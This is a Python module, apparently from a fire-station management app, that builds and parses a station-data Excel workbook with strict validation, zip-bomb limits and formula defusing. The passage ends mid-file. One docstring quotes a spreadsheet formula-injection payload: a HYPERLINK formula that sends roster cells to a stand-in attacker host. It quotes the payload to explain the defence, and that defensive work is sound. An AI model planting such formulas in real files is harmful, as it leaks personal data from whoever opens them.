"""The station-data workbook: one ``.xlsx`` a station downloads, edits in Excel/Numbers/
LibreOffice and uploads back.

Scope, stated once because the boundary is the feature: this carries the **list-shaped**
station data — Mannschaft, Dienstgrade, Fahrzeuge, Mittel + Bestände + Quellen,
Partnerorganisationen, Symbolfeld-Optionen. It is **not a backup** (that is the Sicherung's
JSON export plus ``admin_config history/restore``), and it deliberately carries no secrets, no
logos, no Objektpläne, no Kartenebenen and no Alarm-Stichwörter. A station re-importing this
file restores none of those, and the admin page says so.

Five rules hold this together, each of them somebody else's outage:

1. **Upsert only — there is no ``replace`` mode and there must never be one.** kp-front's
   "clear the table" would be one branch of the very write that also carries ``doctrine``,
   ``identity`` and ``mittel``: a whole-document replace. Deletion is expressed by a row's
   ABSENCE from a sheet that is present, it is always previewed by name, and it is always
   confirmed. (kp-rueck spent three fixes on the mode picker this design does not have —
   see the study in scratchpad/parity.)
2. **An absent sheet is not an empty sheet.** :class:`ParsedSheet` carries ``present`` so the
   difference is representable at all. A workbook with no ``Fahrzeuge`` tab does not touch the
   fleet; a ``Fahrzeuge`` tab holding only its header clears it, on purpose, after a preview
   that says so.
3. **Strict headers.** Every config model is ``extra="ignore"``, so a dropped column looks
   like a successful import. A sheet whose header row is not exactly the expected list is
   refused, not silently narrowed.
4. **Ids are join keys, not row labels.** ``fleet.vehicles[].id`` is matched by plain string
   compare against Traccar device names and milestone payloads; ``mittel.catalogue[].id`` is
   referenced by stock, by ``when`` and by the stored data of incidents that are already
   closed; ``roster.ranks[].key`` is referenced by every person. Excel corrupts these for a
   living — leading zeros, capitalisation, ``2-1`` silently becoming a date. So a key cell is
   read as text or refused with the cell quoted back, never rewritten to something plausible.
   Formulas cannot leak in either: the workbook is read with ``data_only=True``.
5. **Not everything in these sections is spreadsheet-shaped.** ``mittel.catalogue[].when`` is
   a rule (``dict | list[dict]`` with OR semantics), and ``fleet.vehicles[].winfapAlias`` has
   no editor anywhere. Both are CARRIED OVER on an id match and never constructed here. A
   round trip that dropped them would be data loss under a success badge.

Nothing in this module touches a session or FastAPI: :func:`parse_workbook` and
:func:`build_workbook` are pure over bytes, :func:`plan_import` is pure over the stored
document. The endpoint (app/api/station_workbook.py) does the reading, the writing and the
transaction.
"""

from __future__ import annotations

import re
import uuid
from collections.abc import Iterable, Sequence
from dataclasses import dataclass, field
from datetime import date, datetime
from io import BytesIO
from typing import Any, Literal, Protocol

from openpyxl import Workbook, load_workbook
from openpyxl.cell.cell import Cell
from openpyxl.styles import Alignment, Font, PatternFill
from openpyxl.utils import get_column_letter
from pydantic import BaseModel

from ..config_history import emptied_sections
from ..personnel import (
    DEFAULT_NAME_ORDER,
    NameOrder,
    RosterCsvRow,
    RosterIndex,
    RosterPlan,
    match_rank,
    normalize_name,
    person_display_name,
    plan_roster_rows,
)
from ..schemas import load_stored_config

# ── the contract ───────────────────────────────────────────────────────────────────────
#
# Sheet names and headers are German because the whole product is, and because a sheet name
# in an error message has to name an actual tab in the operator's own file. They are defined
# once here and reused by the export, the parser and the header check — a template that can
# drift from its own importer is the kp-rueck failure mode in a different costume.

SHEET_MANNSCHAFT = "Mannschaft"
SHEET_DIENSTGRADE = "Dienstgrade"
SHEET_FAHRZEUGE = "Fahrzeuge"
SHEET_MITTEL = "Mittel"
SHEET_BESTAENDE = "Mittel-Bestände"
SHEET_QUELLEN = "Quellen"
SHEET_PARTNER = "Partnerorganisationen"
SHEET_SYMBOLFELDER = "Symbolfelder"

#: Sheet → its header row, exactly, in order. Nothing else is accepted (rule 3).
COLUMNS: dict[str, tuple[str, ...]] = {
    SHEET_MANNSCHAFT: ("Name", "Grad", "Quelle", "Externe ID", "Aktiv"),
    SHEET_DIENSTGRADE: ("Schlüssel", "Bezeichnung", "Kürzel", "Stufe"),
    SHEET_FAHRZEUGE: ("Kennung", "Bezeichnung"),
    SHEET_MITTEL: ("Kennung", "Bezeichnung", "Einheit", "Kategorie", "Symbol", "Verbrauchbar"),
    SHEET_BESTAENDE: ("Mittel-Kennung", "Quellen-Kennung", "Anzahl"),
    SHEET_QUELLEN: ("Kennung", "Bezeichnung"),
    SHEET_PARTNER: ("Kategorie", "Name"),
    SHEET_SYMBOLFELDER: ("Symbol", "Feld", "Option"),
}

#: Export order. Also the order the preview lists its impact in.
SHEET_ORDER: tuple[str, ...] = (
    SHEET_MANNSCHAFT,
    SHEET_DIENSTGRADE,
    SHEET_FAHRZEUGE,
    SHEET_MITTEL,
    SHEET_BESTAENDE,
    SHEET_QUELLEN,
    SHEET_PARTNER,
    SHEET_SYMBOLFELDER,
)

#: Column widths, per sheet, in Excel character units — wide enough that a station's real
#: labels are readable without the operator having to drag anything on first open.
_WIDTHS: dict[str, tuple[int, ...]] = {
    SHEET_MANNSCHAFT: (28, 22, 14, 16, 8),
    SHEET_DIENSTGRADE: (26, 26, 12, 16),
    SHEET_FAHRZEUGE: (18, 30),
    SHEET_MITTEL: (22, 32, 10, 20, 22, 14),
    SHEET_BESTAENDE: (22, 22, 10),
    SHEET_QUELLEN: (18, 30),
    SHEET_PARTNER: (20, 34),
    SHEET_SYMBOLFELDER: (26, 20, 28),
}

#: Which cells are KEYS and must therefore survive Excel untouched (rule 4). Written as
#: explicit text cells on export and re-validated on import.
_KEY_CELLS: dict[str, tuple[int, ...]] = {  # sheet → 0-based column indices
    SHEET_DIENSTGRADE: (0,),
    SHEET_FAHRZEUGE: (0,),
    SHEET_MITTEL: (0,),
    SHEET_BESTAENDE: (0, 1),
    SHEET_QUELLEN: (0,),
    SHEET_MANNSCHAFT: (3,),  # Externe ID — a payroll number with a leading zero is the case
}

#: ``roster.ranks[].tier`` in the operator's words. The only enum with three options.
TIER_LABELS: dict[str, str] = {"officer": "Offizier", "nco": "Unteroffizier", "crew": "Mannschaft"}
_TIER_BY_LABEL = {normalize_name(v): k for k, v in TIER_LABELS.items()}

#: Partnerorganisationen live in six separate config lists; the sheet flattens them into a
#: ``Kategorie`` column. ``Rapport`` is ``report.partnerOrgs`` (the Ankreuz-Zeile on the
#: Rapport); the other five are ``fleet.partner.*`` (the Einheit suggestions on the partner
#: symbols). One sheet, because to a station they are one list of "wer war sonst noch da".
PARTNER_LABELS: dict[str, str] = {
    "rapport": "Rapport",
    "feuerwehr": "Feuerwehr",
    "sanitaet": "Sanität",
    "polizei": "Polizei",
    "chemiewehr": "Chemiewehr",
    "zivilschutz": "Zivilschutz",
}
_PARTNER_BY_LABEL = {normalize_name(v): k for k, v in PARTNER_LABELS.items()}

_YES, _NO = "ja", "nein"
_TRUE = {"ja", "j", "true", "wahr", "x", "1", "yes", "y"}
_FALSE = {"nein", "n", "false", "falsch", "0", "no", "-"}

#: A NEW key has to look like one: lowercase, no spaces, no surprises. Existing keys are
#: exempt (see :func:`_key`) — the station's reality is not this module's to relitigate.
_SLUG = re.compile(r"^[a-z0-9][a-z0-9._-]*$")
_SLUG_MAX = 64

#: How much of the operator's own cell is quoted back in an error. Their file, their words —
#: but a cell holds up to 32k characters and none of them belong in an HTTP response.
_CELL_CAP = 60

#: How many removals are NAMED before the rest become "und N weitere". A number alone is
#: useless to the person who has to act on it (kp-rueck's `_BLOCKER_LIMIT`, same reasoning).
REMOVAL_LIMIT = 8


# ── errors ─────────────────────────────────────────────────────────────────────────────


def cell_text(value: Any) -> str:
    """The operator's own cell value, quoted and capped, for an error message."""
    if value is None:
        return "«»"
    text = str(value).strip()
    if len(text) > _CELL_CAP:
        text = text[: _CELL_CAP - 1] + "…"
    return f"«{text}»"


def located(detail: str, *, sheet: str, row: int | None = None) -> str:
    """One refused thing, where the operator can find it: ``«Mittel Zeile 7 – …»``.

    The shape is kp-rueck's, proven on a station: sheet, row, what is wrong, and the cell
    value quoted back. Every ``detail`` in this module is a German literal authored here that
    interpolates only the uploaded file's own cells and this module's own constants — never a
    path, a query or a parser's exception text — which is what makes it safe to forward
    verbatim to the browser.
    """
    return f"{sheet} Zeile {row} – {detail}" if row is not None else f"Blatt {sheet} – {detail}"


class WorkbookFileError(Exception):
    """The whole file is unusable — not a bad row, a bad FILE. Raised by the parser only for
    conditions under which there is nothing to preview (not a workbook, unreadable)."""


# ── parsed rows ────────────────────────────────────────────────────────────────────────


@dataclass
class PersonRow:
    line: int
    name: str
    rank_text: str
    provider: str
    external_id: str
    active: bool


@dataclass
class RankRow:
    line: int
    key: str
    label: str
    abbr: str | None
    tier: str


@dataclass
class VehicleRow:
    line: int
    id: str
    label: str


@dataclass
class MittelRow:
    line: int
    id: str
    label: str
    unit: str | None
    category: str | None
    symbol: str | None
    verbrauchbar: bool


@dataclass
class StockRow:
    line: int
    mittel_id: str
    source_id: str
    qty: int


@dataclass
class SourceRow:
    line: int
    id: str
    label: str


@dataclass
class PartnerRow:
    line: int
    kategorie: str
    name: str


@dataclass
class SymbolFieldRow:
    line: int
    symbol: str
    field: str
    option: str


@dataclass
class ParsedSheet[T]:
    """One sheet as the importer read it.

    ⚠️ ``present`` is the whole point of this type and the reason it is not a bare list.
    "This file says nothing about Fahrzeuge" and "this station has no Fahrzeuge" are different
    statements, and collapsing them is a silent wipe: an operator uploading a Mannschaft-only
    workbook would lose the fleet. Absent → the key path is not touched at all. Present with
    only a header row → the key path is cleared, deliberately, after a preview that names it.

    ``usable`` is false when the sheet is there but its header row was refused: the rows could
    not be read, so the file is refused as a whole rather than half-applied.
    """

    present: bool
    usable: bool = True
    rows: list[T] = field(default_factory=list)


@dataclass
class ParsedWorkbook:
    mannschaft: ParsedSheet[PersonRow]
    dienstgrade: ParsedSheet[RankRow]
    fahrzeuge: ParsedSheet[VehicleRow]
    mittel: ParsedSheet[MittelRow]
    bestaende: ParsedSheet[StockRow]
    quellen: ParsedSheet[SourceRow]
    partner: ParsedSheet[PartnerRow]
    symbolfelder: ParsedSheet[SymbolFieldRow]
    #: refused rows / headers, already located and in German
    errors: list[str] = field(default_factory=list)
    #: tabs the importer does not know — reported, never silently ignored (see parse_workbook)
    unknown_sheets: list[str] = field(default_factory=list)


# ── cell readers ───────────────────────────────────────────────────────────────────────


class _Ctx:
    """Where the cell being read lives, so a refusal can say so."""

    def __init__(self, errors: list[str], sheet: str) -> None:
        self.errors = errors
        self.sheet = sheet

    def fail(self, row: int, detail: str) -> None:
        self.errors.append(located(detail, sheet=self.sheet, row=row))


def _defuse_formulas(cells: Iterable[Cell]) -> None:
    """Make every exported cell TEXT, never a formula. Applied to each row as it is written.

    ⚠️ THE ATTACK THIS CLOSES, and it runs down the feature's happy path. openpyxl decides a
    cell is a formula from its first character: a string starting with «=» is written as an
    `<f>` element, i.e. a live formula. Almost everything on these sheets is station data that
    somebody TYPED — a member's name, a Partnerorganisation, a Symbolfeld option — and adding a
    member is `EditorOrAdmin`, one rung BELOW the admin who exports. So an incident editor could
    name themselves

        =HYPERLINK("https://evil.example/?x="&TEXTJOIN(",",1,A2:D99),"Mannschaft öffnen")

    and wait: «Verwaltung › Daten › Arbeitsmappe» is exactly what an admin then downloads and
    opens, and the roster leaves with one click. In LibreOffice the same cell reaches DDE, which
    the module docstring names as a supported editor.

    ⚠️ Done by RETYPING the cell (`data_type = "s"`), not by prefixing an apostrophe. Both are
    inert in the saved file, but the apostrophe is stored as part of the string here — openpyxl
    has no quote-prefix style — so it would be visible in the cell AND would come back as part
    of the value on the next import. This workbook's whole point is that it is edited and given
    back; a control that silently renames «=Foo» to «'=Foo» every round trip is a data bug.

    ⚠️ Applied to the whole ROW rather than inside `_text`. `_text` is the IMPORT parser too
    (`_required_text`, `_optional_text`, `_key`), where escaping would corrupt real values —
    a «+41 79 …» phone number and any label starting with «-» both lead with a formula
    character. Row-level also means a column added later is covered without anyone remembering
    this, which matters because four columns already bypass `_text` on the way out (the
    Mannschaft name and its two identity columns, the Partner name and the Symbolfeld option).
    """
    for cell in cells:
        if cell.data_type == "f":
            cell.data_type = "s"


def _blank(value: Any) -> bool:
    return value is None or (isinstance(value, str) and not value.strip())


def _text(value: Any) -> str:
    """A display cell as a string. Numbers are accepted (a label may legitimately be «112»);
    ``None`` becomes empty."""
    if value is None:
        return ""
    if isinstance(value, float) and value.is_integer():
        return str(int(value))
    return str(value).strip()


def _key(value: Any, *, known: set[str], ctx: _Ctx, row: int, column: str, slug: bool = True) -> str | None:
    """A KEY cell — an id/Schlüssel that other data joins on (rule 4).

    Three refusals, and each of them is Excel having "helped":

    * a **date** — ``2-1`` and ``3.11`` are read as dates the moment the cell is not text;
    * a **number** — ``01`` loses its zero, ``11`` stops being a string;
    * anything that does not look like a key at all (spaces, capitals, umlauts).

    The third is waived for a key the station ALREADY has: it is the id that is out there in
    Traccar, in closed incidents and on every person, and refusing it would make the station's
    own export unimportable. New keys must be well-formed, because a new key is a decision
    being made right now, and refusing it costs one corrected keystroke.
    """
    if _blank(value):
        ctx.fail(row, f"{column} fehlt.")
        return None
    if isinstance(value, datetime | date):
        ctx.fail(
            row,
            # Shown the way the operator sees it in their own cell — an ISO timestamp is this
            # module's rendering of the problem, not theirs.
            f"{column} {cell_text(value.strftime('%d.%m.%Y'))} ist ein Datum. Excel hat die "
            "Kennung umgewandelt – Zelle als «Text» formatieren und die Kennung neu eintippen.",
        )
        return None
    if isinstance(value, bool | int | float):
        ctx.fail(
            row,
            f"{column} {cell_text(value)} ist eine Zahl. Kennungen sind Text – führende Nullen "
            "und Bindestriche gehen sonst verloren. Zelle als «Text» formatieren.",
        )
        return None
    text = str(value).strip()
    if not slug or text in known:
        return text
    if len(text) > _SLUG_MAX or not _SLUG.match(text):
        ctx.fail(
            row,
            f"{column} {cell_text(text)} ist keine gültige neue Kennung. Erlaubt sind "
            "Kleinbuchstaben, Ziffern, Punkt, Bindestrich und Unterstrich – z. B. «tlf-31».",
        )
        return None
    return text


def _required_text(value: Any, *, ctx: _Ctx, row: int, column: str) -> str | None:
    text = _text(value)
    if not text:
        ctx.fail(row, f"{column} fehlt.")
        return None
    return text


def _optional_text(value: Any) -> str | None:
    text = _text(value)
    return text or None


def _bool_cell(value: Any, *, ctx: _Ctx, row: int, column: str, default: bool) -> bool:
    if _blank(value):
        return default
    if isinstance(value, bool):
        return value
    text = normalize_name(_text(value))
    if text in _TRUE:
        return True
    if text in _FALSE:
        return False
    ctx.fail(row, f"{column} {cell_text(value)} ist weder «{_YES}» noch «{_NO}».")
    return default


def _int_cell(value: Any, *, ctx: _Ctx, row: int, column: str) -> int | None:
    if _blank(value):
        ctx.fail(row, f"{column} fehlt.")
        return None
    if isinstance(value, bool):
        ctx.fail(row, f"{column} {cell_text(value)} ist keine ganze Zahl.")
        return None
    if isinstance(value, int):
        return value
    if isinstance(value, float) and value.is_integer():
        return int(value)
    text = _text(value).replace("'", "")
    try:
        return int(text)
    except ValueError:
        ctx.fail(row, f"{column} {cell_text(value)} ist keine ganze Zahl.")
        return None


def _enum_cell(
    value: Any, *, table: dict[str, str], labels: dict[str, str], ctx: _Ctx, row: int, column: str
) -> str | None:
    """One of a fixed set, matched on the German label (accent- and case-insensitively) or on
    the stored key itself. The allowed set is spelled out in the refusal — the operator should
    not have to go looking for it."""
    text = _text(value)
    if not text:
        ctx.fail(row, f"{column} fehlt. Erlaubt: {', '.join(labels.values())}.")
        return None
    hit = table.get(normalize_name(text)) or (text if text in labels else None)
    if hit is None:
        ctx.fail(row, f"{column} {cell_text(text)} ist unbekannt. Erlaubt: {', '.join(labels.values())}.")
        return None
    return hit


# ── reading the file ───────────────────────────────────────────────────────────────────


def _trim(row: Sequence[Any]) -> list[Any]:
    """Drop trailing empty cells — Numbers and LibreOffice pad rows out to the used range."""
    cells = list(row)
    while cells and _blank(cells[-1]):
        cells.pop()
    return cells


def _check_header(sheet: str, header: list[Any], errors: list[str]) -> bool:
    """The header row must be EXACTLY the expected list — same names, same order, nothing
    extra, nothing missing.

    ⚠️ This check carries more weight here than in a table-shaped app. Every config model is
    ``extra="ignore"``, so a column the schema does not know is dropped without a word: the
    operator renames «Einheit» to «Einheiten», imports, sees a green badge and has silently
    cleared the unit off every material. Refusing is the only outcome that tells them.
    """
    expected = COLUMNS[sheet]
    found = [_text(c) for c in _trim(header)]
    if found == list(expected):
        return True
    shown = found[: len(expected) + 3]
    if len(found) > len(shown):
        shown.append("…")
    errors.append(
        located(
            f"unerwartete Kopfzeile. Erwartet: {' · '.join(expected)}. "
            f"Gefunden: {' · '.join(shown) if shown else '(leer)'}.",
            sheet=sheet,
        )
    )
    return False


#: An `.xlsx` IS a zip, and `load_workbook` will happily inflate whatever it holds. These three
#: bound what one upload may cost before openpyxl is handed a single byte. A real station
#: workbook is a few hundred kB and eight sheets; the caps are two orders of magnitude above
#: anything legitimate, so they can only ever be hit on purpose.
_MAX_MEMBERS = 512
_MAX_UNCOMPRESSED_BYTES = 128 * 1024 * 1024
_MAX_COMPRESSION_RATIO = 200

#: Rows per sheet the parser will consider. The Mannschaft of the biggest Swiss Milizfeuerwehr
#: is a few hundred; 50 000 is «somebody is not importing a roster».
_MAX_ROWS_PER_SHEET = 50_000


def _check_archive(data: bytes) -> None:
    """Refuse a zip bomb before openpyxl inflates it.

    ⚠️ Ordered BEFORE `load_workbook`, and that is the whole point: `max_upload_mb` bounds what
    arrives on the wire, not what it becomes in memory. A ~1 MB upload of one highly compressible
    sheet inflates to gigabytes inside `load_workbook`, and the container is OOM-killed — which
    on this deployment means the Lagekarte dies mid-Einsatz because somebody was on the admin
    page. Admin-gated, so this is a robustness bound rather than a privilege boundary; an
    OOM-kill is simply never an acceptable answer to a bad file.

    The central directory is read from the zip's own metadata (no inflation), so the check costs
    nothing. `zipfile` is stdlib and openpyxl is about to open the same bytes with it anyway.
    """
    import zipfile

    try:
        with zipfile.ZipFile(BytesIO(data)) as zf:
            infos = zf.infolist()
    except zipfile.BadZipFile as exc:
        raise WorkbookFileError(
            "Die Datei konnte nicht als Excel-Arbeitsmappe geöffnet werden. "
            "Ist es wirklich eine .xlsx-Datei (nicht CSV, nicht umbenannt)?"
        ) from exc
    if len(infos) > _MAX_MEMBERS:
        raise WorkbookFileError(f"Die Arbeitsmappe enthält zu viele Teile ({len(infos)}).")
    total = sum(i.file_size for i in infos)
    if total > _MAX_UNCOMPRESSED_BYTES:
        raise WorkbookFileError(
            f"Die Arbeitsmappe ist entpackt zu gross ({total // (1024 * 1024)} MB) und wird nicht geöffnet."
        )
    packed = sum(i.compress_size for i in infos)
    if packed > 0 and total // packed > _MAX_COMPRESSION_RATIO:
        raise WorkbookFileError("Die Arbeitsmappe ist auffällig stark komprimiert und wird nicht geöffnet.")


def _rows(ws: Any) -> list[tuple[int, list[Any]]]:
    """``(1-based row number, cells)`` for every non-empty data row after the header.

    Stops at :data:`_MAX_ROWS_PER_SHEET`. `read_only=True` streams, so without a stop the
    per-sheet cost is whatever the file declares — and the accumulated `out` list is what
    actually holds the memory.
    """
    out: list[tuple[int, list[Any]]] = []
    for n, raw in enumerate(ws.iter_rows(min_row=2, values_only=True), start=2):
        if len(out) >= _MAX_ROWS_PER_SHEET:
            raise WorkbookFileError(
                f"Das Blatt «{ws.title}» hat mehr als {_MAX_ROWS_PER_SHEET} Zeilen — das ist keine Stationsliste."
            )
        cells = _trim(raw)
        if not cells:
            continue  # fully blank row — trailing padding from Numbers/LibreOffice
        out.append((n, cells))
    return out


def _at(cells: list[Any], i: int) -> Any:
    return cells[i] if i < len(cells) else None


def known_keys(config: dict[str, Any]) -> set[str]:
    """Every key the station ALREADY uses. Passed to the parser so an id that is out there in
    Traccar, in closed incidents and on every person is never refused for not matching today's
    slug rule — only a NEW key is a decision being made right now (see :func:`_key`)."""
    out = {str(r.get("key")) for r in _stored_ranks(config)}
    out |= {str(v.get("id")) for v in _section(config, "fleet", "vehicles")}
    out |= {str(m.get("id")) for m in _section(config, "mittel", "catalogue")}
    out |= {str(s.get("id")) for s in _section(config, "mittel", "sources")}
    return out


def parse_workbook(data: bytes, known: set[str] | None = None) -> ParsedWorkbook:
    """Read the uploaded bytes into rows + every refusal, located.

    Runs to completion: the operator gets ALL the bad cells at once, not the first one, then
    the next one on the next upload. Nothing is written by this function and nothing is
    written by its caller unless ``errors`` is empty — the whole file is refused or the whole
    file is applied, never half.

    ⚠️ ``data_only=True``. Without it openpyxl hands back the FORMULA — a ``=CONCAT(A2;"-31")``
    in a Kennung cell would import as that literal string and become a vehicle id no Traccar
    device will ever match.
    """
    _check_archive(data)
    try:
        wb = load_workbook(BytesIO(data), data_only=True, read_only=True)
    except Exception as exc:  # openpyxl raises a zoo; the operator gets one sentence
        raise WorkbookFileError(
            "Die Datei konnte nicht als Excel-Arbeitsmappe geöffnet werden. "
            "Ist es wirklich eine .xlsx-Datei (nicht CSV, nicht umbenannt)?"
        ) from exc
    try:
        errors: list[str] = []
        present = {name: wb[name] for name in wb.sheetnames if name in COLUMNS}
        unknown = [n for n in wb.sheetnames if n not in COLUMNS]

        def read[T](sheet: str, build: Any) -> ParsedSheet[T]:
            ws = present.get(sheet)
            if ws is None:
                return ParsedSheet[T](present=False)
            rows = list(ws.iter_rows(min_row=1, max_row=1, values_only=True))
            header = list(rows[0]) if rows else []
            if not _check_header(sheet, header, errors):
                return ParsedSheet[T](present=True, usable=False)
            ctx = _Ctx(errors, sheet)
            out: list[T] = []
            for n, cells in _rows(ws):
                built = build(n, cells, ctx, known or set())
                if built is not None:
                    out.append(built)
            return ParsedSheet[T](present=True, rows=out)

        parsed = ParsedWorkbook(
            mannschaft=read(SHEET_MANNSCHAFT, _person_row),
            dienstgrade=read(SHEET_DIENSTGRADE, _rank_row),
            fahrzeuge=read(SHEET_FAHRZEUGE, _vehicle_row),
            mittel=read(SHEET_MITTEL, _mittel_row),
            bestaende=read(SHEET_BESTAENDE, _stock_row),
            quellen=read(SHEET_QUELLEN, _source_row),
            partner=read(SHEET_PARTNER, _partner_row),
            symbolfelder=read(SHEET_SYMBOLFELDER, _symbol_row),
            errors=errors,
            unknown_sheets=unknown,
        )
        return parsed
    finally:
        wb.close()


# The row builders. Each returns None when the row was refused (the error is already on the
# context) — a refused row is never carried into the plan, and a plan with any error is never
# applied, so the two can never disagree.


def _person_row(n: int, cells: list[Any], ctx: _Ctx, known: set[str]) -> PersonRow | None:
    name = _required_text(_at(cells, 0), ctx=ctx, row=n, column="Name")
    provider = (_text(_at(cells, 2)) or "").lower()
    external = (
        _key(_at(cells, 3), known=known, slug=False, ctx=ctx, row=n, column="Externe ID")
        if not _blank(_at(cells, 3))
        else ""
    )
    active = _bool_cell(_at(cells, 4), ctx=ctx, row=n, column="Aktiv", default=True)
    if name is None or external is None:
        return None
    if provider and not external:
        ctx.fail(n, "Quelle ist gesetzt, aber die Externe ID fehlt – ohne sie gibt es keine Identität.")
        return None
    if external and not provider:
        ctx.fail(n, "Externe ID ist gesetzt, aber die Quelle fehlt (z. B. «divera»).")
        return None
    return PersonRow(
        line=n, name=name, rank_text=_text(_at(cells, 1)), provider=provider, external_id=external, active=active
    )


def _rank_row(n: int, cells: list[Any], ctx: _Ctx, known: set[str]) -> RankRow | None:
    key = _key(_at(cells, 0), known=known, ctx=ctx, row=n, column="Schlüssel")
    label = _required_text(_at(cells, 1), ctx=ctx, row=n, column="Bezeichnung")
    tier = _enum_cell(_at(cells, 3), table=_TIER_BY_LABEL, labels=TIER_LABELS, ctx=ctx, row=n, column="Stufe")
    if key is None or label is None or tier is None:
        return None
    return RankRow(line=n, key=key, label=label, abbr=_optional_text(_at(cells, 2)), tier=tier)


def _vehicle_row(n: int, cells: list[Any], ctx: _Ctx, known: set[str]) -> VehicleRow | None:
    vid = _key(_at(cells, 0), known=known, ctx=ctx, row=n, column="Kennung")
    label = _required_text(_at(cells, 1), ctx=ctx, row=n, column="Bezeichnung")
    if vid is None or label is None:
        return None
    return VehicleRow(line=n, id=vid, label=label)


def _mittel_row(n: int, cells: list[Any], ctx: _Ctx, known: set[str]) -> MittelRow | None:
    mid = _key(_at(cells, 0), known=known, ctx=ctx, row=n, column="Kennung")
    label = _required_text(_at(cells, 1), ctx=ctx, row=n, column="Bezeichnung")
    verbrauchbar = _bool_cell(_at(cells, 5), ctx=ctx, row=n, column="Verbrauchbar", default=False)
    if mid is None or label is None:
        return None
    return MittelRow(
        line=n,
        id=mid,
        label=label,
        unit=_optional_text(_at(cells, 2)),
        category=_optional_text(_at(cells, 3)),
        symbol=_optional_text(_at(cells, 4)),
        verbrauchbar=verbrauchbar,
    )


def _stock_row(n: int, cells: list[Any], ctx: _Ctx, known: set[str]) -> StockRow | None:
    mid = _key(_at(cells, 0), known=known, ctx=ctx, row=n, column="Mittel-Kennung")
    sid = _key(_at(cells, 1), known=known, ctx=ctx, row=n, column="Quellen-Kennung")
    qty = _int_cell(_at(cells, 2), ctx=ctx, row=n, column="Anzahl")
    if mid is None or sid is None or qty is None:
        return None
    if qty < 0:
        ctx.fail(n, f"Anzahl {cell_text(qty)} ist negativ.")
        return None
    return StockRow(line=n, mittel_id=mid, source_id=sid, qty=qty)


def _source_row(n: int, cells: list[Any], ctx: _Ctx, known: set[str]) -> SourceRow | None:
    sid = _key(_at(cells, 0), known=known, ctx=ctx, row=n, column="Kennung")
    label = _required_text(_at(cells, 1), ctx=ctx, row=n, column="Bezeichnung")
    if sid is None or label is None:
        return None
    return SourceRow(line=n, id=sid, label=label)


def _partner_row(n: int, cells: list[Any], ctx: _Ctx, known: set[str]) -> PartnerRow | None:
    kat = _enum_cell(_at(cells, 0), table=_PARTNER_BY_LABEL, labels=PARTNER_LABELS, ctx=ctx, row=n, column="Kategorie")
    name = _required_text(_at(cells, 1), ctx=ctx, row=n, column="Name")
    if kat is None or name is None:
        return None
    return PartnerRow(line=n, kategorie=kat, name=name)


def _symbol_row(n: int, cells: list[Any], ctx: _Ctx, known: set[str]) -> SymbolFieldRow | None:
    symbol = _required_text(_at(cells, 0), ctx=ctx, row=n, column="Symbol")
    fld = _required_text(_at(cells, 1), ctx=ctx, row=n, column="Feld")
    option = _required_text(_at(cells, 2), ctx=ctx, row=n, column="Option")
    if symbol is None or fld is None or option is None:
        return None
    return SymbolFieldRow(line=n, symbol=symbol, field=fld, option=option)


# ── writing the file ───────────────────────────────────────────────────────────────────

_HEADER_FILL = PatternFill("solid", fgColor="1F3A5F")
_HEADER_FONT = Font(bold=True, color="FFFFFF")


class RosterPerson(Protocol):
    """A roster row as the workbook reads it — the ORM model, narrowed to what is used."""

    id: uuid.UUID
    display_name: str
    first_name: str | None
    last_name: str | None
    rank: str | None
    is_active: bool


def build_workbook(
    config: dict[str, Any],
    people: list[RosterPerson],
    identities: dict[uuid.UUID, tuple[str, str]],
    order: NameOrder = DEFAULT_NAME_ORDER,
) -> bytes:
    """The station's current data, in the exact shape :func:`parse_workbook` accepts.

    This is the template AND the undo: re-importing an untouched export must change nothing,
    which is the one test that catches a corrupted id or a lost ``when`` rule. It is NOT a
    backup of the deployment — six of a dozen config sections are outside this file entirely.

    ``identities`` maps a person to the ``(provider, external_id)`` the workbook round-trips.
    A person holding several is written with the first one; a workbook cannot express more
    than one identity per row and inventing extra rows would split the person in two.
    """
    wb = Workbook()
    wb.remove(wb.active)
    ranks = _stored_ranks(config)
    rank_label = {str(r.get("key")): _text(r.get("label") or r.get("key")) for r in ranks}

    rows_by_sheet: dict[str, list[list[Any]]] = {
        SHEET_MANNSCHAFT: [
            [
                person_display_name(p, order),
                rank_label.get(p.rank or "", p.rank or ""),
                identities.get(p.id, ("", ""))[0],
                identities.get(p.id, ("", ""))[1],
                _YES if p.is_active else _NO,
            ]
            for p in sorted(people, key=lambda p: normalize_name(person_display_name(p, order)))
        ],
        SHEET_DIENSTGRADE: [
            [
                _text(r.get("key")),
                _text(r.get("label")),
                _text(r.get("abbr")),
                TIER_LABELS.get(str(r.get("tier") or "crew"), TIER_LABELS["crew"]),
            ]
            for r in ranks
        ],
        SHEET_FAHRZEUGE: [[_text(v.get("id")), _text(v.get("label"))] for v in _section(config, "fleet", "vehicles")],
        SHEET_MITTEL: [
            [
                _text(m.get("id")),
                _text(m.get("label")),
                _text(m.get("unit")),
                _text(m.get("category")),
                _text(m.get("symbol")),
                _YES if m.get("verbrauchbar") else _NO,
            ]
            for m in _section(config, "mittel", "catalogue")
        ],
        SHEET_BESTAENDE: [
            [_text(m.get("id")), _text(s.get("source")), s.get("qty")]
            for m in _section(config, "mittel", "catalogue")
            for s in (m.get("stock") or [])
        ],
        SHEET_QUELLEN: [[_text(s.get("id")), _text(s.get("label"))] for s in _section(config, "mittel", "sources")],
        SHEET_PARTNER: [[PARTNER_LABELS[kat], name] for kat, name in _partner_pairs(config)],
        SHEET_SYMBOLFELDER: [
            [_text(a.get("symbol")), _text(a.get("field")), option]
            for a in _section(config, "fleet", "attributeLists")
            for option in (a.get("options") or [])
        ],
    }

    for sheet in SHEET_ORDER:
        ws = wb.create_sheet(sheet)
        ws.append(list(COLUMNS[sheet]))
        for cell in ws[1]:
            cell.font = _HEADER_FONT
            cell.fill = _HEADER_FILL
            cell.alignment = Alignment(vertical="center")
        for width, i in zip(_WIDTHS[sheet], range(1, len(COLUMNS[sheet]) + 1), strict=True):
            ws.column_dimensions[get_column_letter(i)].width = width
        # ⚠️ Key columns are stamped as TEXT — the whole column, so a row the operator TYPES
        # at the bottom is text too. Without it Excel re-interprets «2-1» as a date and «011»
        # as eleven, and the id that comes back is not the id that went out (rule 4).
        keys = _KEY_CELLS.get(sheet, ())
        for i in keys:
            ws.column_dimensions[get_column_letter(i + 1)].number_format = "@"
        for values in rows_by_sheet[sheet]:
            ws.append(values)
            _defuse_formulas(ws[ws.max_row])
            for i in keys:
                ws.cell(row=ws.max_row, column=i + 1).number_format = "@"
        ws.freeze_panes = "A2"

    buf = BytesIO()
    wb.save(buf)
    return buf.getvalue()


def _section(config: dict[str, Any], top: str, key: str) -> list[dict[str, Any]]:
